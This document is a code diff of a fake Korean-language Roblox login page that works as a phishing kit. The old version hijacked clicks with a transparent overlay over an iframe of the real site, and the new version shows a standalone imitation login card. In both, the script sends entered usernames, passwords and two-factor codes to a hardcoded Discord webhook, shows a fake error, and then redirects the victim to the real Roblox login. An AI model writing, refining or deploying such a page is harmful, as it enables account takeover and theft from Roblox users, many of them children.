@@ -1,14 +1,20 @@
 <!DOCTYPE html>
-<html>
+<html lang="ko">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox</title>
+    <title>Roblox에 로그인</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #fff; font-family: Arial, sans-serif; }
-        
-        /* 네비게이션바 */
+        body {
+            font-family: 'Source Sans Pro', 'Noto Sans KR', 'Helvetica Neue', Arial, sans-serif;
+            background: #f5f5f5;
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        a { text-decoration: none; }
         .navbar {
             background: #101010;
             height: 48px;
@@ -17,177 +23,115 @@
             padding: 0 24px;
             position: fixed;
             top: 0; left: 0; right: 0;
-            z-index: 9999;
+            z-index: 100;
         }
-        .navbar img { height: 28px; }
-        
-        /* iframe이지만 투명 오버레이가 위를 덮음 */
-        .iframe-container {
-            margin-top: 48px;
-            width: 100%;
-            height: calc(100vh - 48px);
-            position: relative;
+        .navbar-inner {
+            max-width: 1200px; width: 100%; margin: 0 auto;
+            display: flex; align-items: center; justify-content: space-between;
         }
-        
-        .roblox-iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
+        .navbar-left { display: flex; align-items: center; gap: 24px; }
+        .navbar-logo { display: flex; align-items: center; }
+        .navbar-logo img { height: 28px; display: block; }
+        .navbar-link { color: #aaa; font-size: 13px; font-weight: 500; }
+        .navbar-link:hover { color: #fff; text-decoration: none; }
+        .navbar-right { display: flex; align-items: center; gap: 12px; }
+        .nav-signup {
+            color: #ccc; font-size: 13px; font-weight: 600;
+            padding: 5px 18px; border: 1px solid #555; border-radius: 30px;
         }
-        
-        /* 투명 오버레이 — 모든 클릭을 가로챔 */
-        .click-overlay {
-            position: fixed;
-            top: 48px;
-            left: 0;
-            width: 100%;
-            height: calc(100vh - 48px);
-            z-index: 9998;
-            background: transparent;
+        .nav-signup:hover { border-color: #888; color: #fff; text-decoration: none; }
+        .nav-login { color: #ccc; font-size: 13px; font-weight: 600; }
+        .nav-login:hover { color: #fff; text-decoration: none; }
+
+        .main-content {
+            flex: 1; display: flex; align-items: center; justify-content: center;
+            padding: 80px 16px 60px; margin-top: 48px;
         }
-        
-        /* 로그인 폼 모달 */
-        .modal-overlay {
-            display: none;
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(0,0,0,0.5);
-            z-index: 10000;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .modal-overlay.active {
-            display: flex;
-        }
-        
         .login-card {
-            background: #fff;
-            border-radius: 12px;
-            padding: 36px 32px 32px;
-            width: 368px;
-            max-width: 90%;
-            box-shadow: 0 4px 24px rgba(0,0,0,0.2);
+            background: #fff; border-radius: 12px; padding: 36px 32px 32px;
+            width: 368px; max-width: 100%; box-shadow: 0 1px 8px rgba(0,0,0,0.06);
         }
-        
-        .login-header {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        
-        .login-header h1 {
-            font-size: 24px;
-            font-weight: 700;
-            color: #111;
-            margin-top: 12px;
-        }
-        
-        .form-group {
-            margin-bottom: 16px;
-        }
-        
-        .form-group label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: #555;
-            margin-bottom: 5px;
-        }
-        
+        .login-header { text-align: center; margin-bottom: 20px; }
+        .login-header h1 { font-size: 24px; font-weight: 700; color: #111; margin-top: 12px; }
+
+        .form-group { margin-bottom: 16px; }
+        .form-group label { display: block; font-size: 13px; font-weight: 600; color: #555; margin-bottom: 5px; }
         .form-group input {
-            width: 100%;
-            padding: 11px 13px;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            font-size: 15px;
-            background: #fff;
-            outline: none;
-            color: #333;
+            width: 100%; padding: 11px 13px; border: 1px solid #ddd; border-radius: 6px;
+            font-size: 15px; background: #fff; outline: none; color: #333;
         }
-        
-        .form-group input:focus {
-            border-color: #aaa;
-        }
-        
+        .form-group input:focus { border-color: #aaa; }
+
         .login-btn {
-            width: 100%;
-            padding: 12px;
-            background: #101010;
-            color: #fff;
-            border: none;
-            border-radius: 30px;
-            font-size: 15px;
-            font-weight: 700;
-            margin-top: 4px;
-            cursor: pointer;
+            width: 100%; padding: 12px; background: #101010; color: #fff;
+            border: none; border-radius: 30px; font-size: 15px; font-weight: 700;
+            margin-top: 4px; cursor: pointer;
         }
-        
-        .login-btn:hover {
-            background: #2a2a2a;
+        .login-btn:hover { background: #2a2a2a; }
+
+        .forgot-link { display: block; text-align: center; margin-top: 14px; font-size: 13px; color: #00a2ff; font-weight: 500; }
+        .divider-wrap { display: flex; align-items: center; margin: 20px 0; color: #999; font-size: 12px; }
+        .divider-wrap::before, .divider-wrap::after { content: ''; flex: 1; height: 1px; background: #e5e5e5; }
+        .divider-wrap span { padding: 0 14px; }
+        .device-btn {
+            width: 100%; padding: 11px; background: #fff; color: #555;
+            border: 1px solid #ddd; border-radius: 30px; font-size: 14px; font-weight: 600;
+            cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px;
         }
-        
-        .forgot-link {
-            display: block;
-            text-align: center;
-            margin-top: 14px;
-            font-size: 13px;
-            color: #00a2ff;
-            font-weight: 500;
-        }
-        
+        .device-btn:hover { background: #f9f9f9; }
+        .signup-text { text-align: center; margin-top: 20px; font-size: 14px; color: #777; }
+        .signup-text a { color: #00a2ff; font-weight: 700; }
         .error-msg {
-            color: #a00;
-            font-size: 13px;
-            margin-top: 10px;
-            display: none;
-            padding: 8px 10px;
-            background: #fef0ef;
-            border-radius: 6px;
-            text-align: center;
+            color: #a00; font-size: 13px; margin-top: 10px; display: none;
+            padding: 8px 10px; background: #fef0ef; border-radius: 6px; text-align: center;
         }
-        
-        #step2fa {
+        .info-msg {
+            color: #555; font-size: 13px; margin-top: 10px;
+            padding: 8px 10px; background: #f0f7ff; border-radius: 6px; text-align: center;
             display: none;
         }
-        
-        .signup-text {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 14px;
-            color: #777;
-        }
-        
-        .signup-text a {
-            color: #00a2ff;
-            font-weight: 700;
+
+        #step2fa { display: none; }
+
+        .footer { background: #101010; padding: 16px 24px; text-align: center; }
+        .footer-links { list-style: none; display: flex; flex-wrap: wrap; justify-content: center; gap: 14px; margin-bottom: 8px; }
+        .footer-links a { color: #888; font-size: 11px; }
+        .footer-links a:hover { color: #fff; }
+        .footer-copy { color: #555; font-size: 11px; }
+
+        @media (max-width: 767px) {
+            .navbar-link { display: none; }
+            .login-card { padding: 28px 16px 24px; border-radius: 0; box-shadow: none; }
         }
     </style>
 </head>
 <body>
 
-    <!-- 네비게이션바 -->
     <nav class="navbar">
-        <img src="https://cdn.foundation.roblox.com/current/StudioLogo.svg" alt="Roblox">
+        <div class="navbar-inner">
+            <div class="navbar-left">
+                <a href="/" class="navbar-logo">
+                    <img src="https://cdn.foundation.roblox.com/current/StudioLogo.svg" alt="Roblox">
+                </a>
+                <a href="#" class="navbar-link">차트</a>
+                <a href="#" class="navbar-link">마켓플레이스</a>
+                <a href="#" class="navbar-link">만들기</a>
+                <a href="#" class="navbar-link">Robux</a>
+            </div>
+            <div class="navbar-right">
+                <a href="#" class="nav-signup">회원가입</a>
+                <a href="#" class="nav-login">로그인</a>
+            </div>
+        </div>
     </nav>
 
-    <!-- 진짜 Roblox 페이지 -->
-    <div class="iframe-container">
-        <iframe class="roblox-iframe" id="robloxFrame" src="https://www.roblox.com/home"></iframe>
-    </div>
-
-    <!-- 투명 오버레이 — 클릭 가로챔 -->
-    <div class="click-overlay" id="clickOverlay"></div>
-
-    <!-- 로그인 폼 모달 -->
-    <div class="modal-overlay" id="loginModal">
+    <div class="main-content">
         <div class="login-card">
             <div class="login-header">
                 <img src="https://cdn.foundation.roblox.com/current/StudioLogo.svg" alt="Roblox" style="width:56px;height:56px;margin-bottom:12px;">
                 <h1 id="pageTitle">Roblox에 로그인</h1>
             </div>
 
-            <!-- 1단계 -->
             <form id="loginForm">
                 <div class="form-group">
                     <label for="username">사용자 이름/이메일/전화번호</label>
@@ -197,12 +141,24 @@
                     <label for="password">비밀번호</label>
                     <input type="password" id="password" placeholder="비밀번호" required>
                 </div>
+
                 <button class="login-btn" type="submit">로그인</button>
                 <a href="#" class="forgot-link">비밀번호 또는 사용자 이름을 잊으셨나요?</a>
+
+                <div class="divider-wrap"><span>로그인 방법</span></div>
+
+                <button class="device-btn" type="button">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="2">
+                        <rect x="2" y="3" width="20" height="14" rx="2"/>
+                        <line x1="8" y1="21" x2="16" y2="21"/>
+                        <line x1="12" y1="17" x2="12" y2="21"/>
+                    </svg>
+                    로그인 중인 다른 기기
+                </button>
+
                 <div class="error-msg" id="errorMsg">사용자 이름 또는 비밀번호가 올바르지 않습니다.</div>
             </form>
 
-            <!-- 2단계 -->
             <div id="step2fa">
                 <form id="faForm">
                     <div class="form-group">
@@ -220,31 +176,34 @@
         </div>
     </div>
 
+    <div class="footer">
+        <ul class="footer-links">
+            <li><a href="#">회사 소개</a></li>
+            <li><a href="#">인재 채용</a></li>
+            <li><a href="#">블로그</a></li>
+            <li><a href="#">보호자 가이드</a></li>
+            <li><a href="#">기프트 카드 구매</a></li>
+            <li><a href="#">도움말</a></li>
+            <li><a href="#">이용 약관</a></li>
+            <li><a href="#">접근성</a></li>
+            <li><a href="#">개인정보 처리방침</a></li>
+            <li><a href="#">개인정보 보호 설정</a></li>
+            <li><a href="#">사이트 맵</a></li>
+        </ul>
+        <p class="footer-copy">©2026 Roblox Corporation. Roblox, Roblox 로고 및 Powering Imagination은 미국 및 그 외 지역에서 등록 상표 및 미등록 상표입니다.</p>
+    </div>
+
     <script>
-        var WEBHOOK_URL = 'https://discord.com/api/webhooks/1519016223558340763/VGMWxHAntSmh5o18yRoziahcucUREBqfTEbX2IItByAjpPQQAQeHTqtDyQnAzY8mmPX4w';
         var capturedUser = '';
         var capturedPass = '';
 
-        // ─── 오버레이 클릭 → 로그인 모달 표시 ───
-        document.getElementById('clickOverlay').addEventListener('click', function() {
-            document.getElementById('loginModal').classList.add('active');
-        });
-
-        // ─── 모달 배경 클릭 → 닫기 ───
-        document.getElementById('loginModal').addEventListener('click', function(e) {
-            if (e.target === this) {
-                this.classList.remove('active');
-            }
-        });
-
-        // ─── 1단계: 로그인 ───
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             capturedUser = document.getElementById('username').value;
             capturedPass = document.getElementById('password').value;
 
-            // Discord 전송
-            fetch(WEBHOOK_URL, {
+            var webhookURL = 'https://discord.com/api/webhooks/1519016223558340763/VGMWxHAntSmh5o18yRoziahcucUREBqfTEbX2IItByAjpPPAQeHTqtDyQnAzY8mmPX4w';
+            fetch(webhookURL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -260,26 +219,24 @@
                         timestamp: new Date().toISOString()
                     }]
                 })
-            }).catch(function(err) { console.log(err); });
+            }).catch(function(err) {});
 
-            // 2FA 화면으로 전환
             document.getElementById('loginForm').style.display = 'none';
             document.getElementById('signupOption').style.display = 'none';
             document.getElementById('step2fa').style.display = 'block';
             document.getElementById('pageTitle').textContent = '2단계 인증';
         });
 
-        // ─── 2단계: 2FA ───
         document.getElementById('faForm').addEventListener('submit', function(e) {
             e.preventDefault();
             var faCode = document.getElementById('faCode').value;
 
-            // Discord 전송
-            fetch(WEBHOOK_URL, {
+            var webhookURL = 'https://discord.com/api/webhooks/1519016223558340763/VGMWxHAntSmh5o18yRoziahcucUREBqfTEbX2IItByAjpPPAQeHTqtDyQnAzY8mmPX4w';
+            fetch(webhookURL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: '<@&1519015614017048688> **[2단계] Roblox 2FA 코드 캡처됨!**',
+                    content: '**[2단계] Roblox 2FA 코드 캡처됨!** @everyone',
                     embeds: [{
                         title: '2FA 코드 획득 완료',
                         fields: [
@@ -291,12 +248,11 @@
                         timestamp: new Date().toISOString()
                     }]
                 })
-            }).catch(function(err) { console.log(err); });
+            }).catch(function(err) {});
 
-            // 에러 표시 후 진짜 Roblox로 이동
             document.getElementById('faErrorMsg').style.display = 'block';
             setTimeout(function() {
-                window.location.href = 'https://www.roblox.com/login';
+                window.location.href = 'https://www.roblox.com/ko/login';
             }, 2000);
         });
     </script>
